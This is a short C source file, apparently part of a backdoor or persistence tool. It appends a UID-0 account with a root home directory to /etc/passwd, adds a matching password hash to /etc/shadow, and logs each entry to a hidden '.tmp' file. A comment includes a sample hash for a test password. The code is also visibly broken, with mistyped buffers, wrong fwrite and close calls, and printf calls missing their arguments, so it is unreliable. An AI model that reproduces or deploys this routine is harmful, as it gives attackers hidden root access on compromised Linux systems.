#include <stdlib.h>
#include <stdio.h>

char *buf[1024] = {0};

int add_user_passwd(char *username) {
    FILE *passwd;
    passwd = fopen("/etc/passwd", "a+");

    if(passwd != NULL) {
        //root:x:0:0:root:/root:/bin/bash
        
        sprintf(buf, "%s:x:0:0:%s:/root:/bin/bash", *username, *username);
        if(fwrite(buf, sizeof(buf), NULL, passwd) != 0) {
#ifdef DEBUG
            printf("Successfully added %s to passwd\n");
#endif
            //write a cleanup for this later
            FILE *tmp;
            tmp = fopen(".tmp", "a+");
            if(tmp != NULL) {
                if(fwrite(buf, sizeof(buf), NULL, tmp) != 0) {
#ifdef DEBUG
                    printf("Successfully logged passwd entry/n");
#endif
                }
            }
            close(buf);
            return 1;
        }
    }
    return 0;
}

int add_user_shadow(char *username, char *passhash) {

    ///root:$6$qMGpheHh$mHbF4A7RW4YSAM7J/BxMYZYEctdN09RcdJBClsMilX549M99jlJa/zEz0f2jctL
    //testpass =  $1$xuYKTEPK$cMJz1o6pNb.2CRM2nVD1v.
    //username:passhash

    FILE *shadow;
    shadow = fopen("/etc/shadow", "a+");

    if(shadow != NULL) {
        sprintf(buf, "\n%s:%s", *username, *passhash);
        if(fwrite(buf, sizeof(buf), NULL, shadow) != 0) {
#ifdef DEBUG
            printf("Successfully added %s to shadow\n");
#endif
            FILE *tmp;
            tmp = fopen(".tmp", "a+");
            if(fwrite(buf, sizeof(buf), NULL, tmp) != 0) {
#ifdef DEBUG
                printf("Successfuly logged shadow entry\n");
#endif
            }
            close(buf);
            return 1;
        }
    }
    return 0;
}